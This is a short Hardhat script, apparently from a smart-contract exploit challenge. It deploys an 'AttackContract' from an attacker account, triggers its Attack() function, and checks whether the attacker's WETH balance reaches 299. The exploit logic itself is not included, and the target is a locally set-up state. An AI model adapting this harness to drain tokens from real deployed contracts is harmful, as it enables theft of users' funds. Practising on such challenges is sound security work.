const { ethers } = require("hardhat");
const { main: setupInitialState } = require("./setupInitialState");

async function main() {
  await setupInitialState();

  const deployed = require("../deployed.json");
  const [attacker] = await ethers.getSigners();
  const weth = await ethers.getContractAt(
    "@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20",
    deployed.weth
  );

  const AttackContract = await ethers.getContractFactory("AttackContract", attacker);
  const attack = await AttackContract.deploy();
  await attack.deployed();

  console.log("AttackContract:", attack.address);
  console.log("WETH before:", ethers.utils.formatEther(await weth.balanceOf(attacker.address)));

  const tx = await attack.Attack({ gasLimit: 90_000_000 });
  await tx.wait();

  const finalWeth = await weth.balanceOf(attacker.address);
  console.log("WETH after:", ethers.utils.formatEther(finalWeth));
  console.log("Target 299 met:", finalWeth.gte(ethers.utils.parseEther("299")));
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
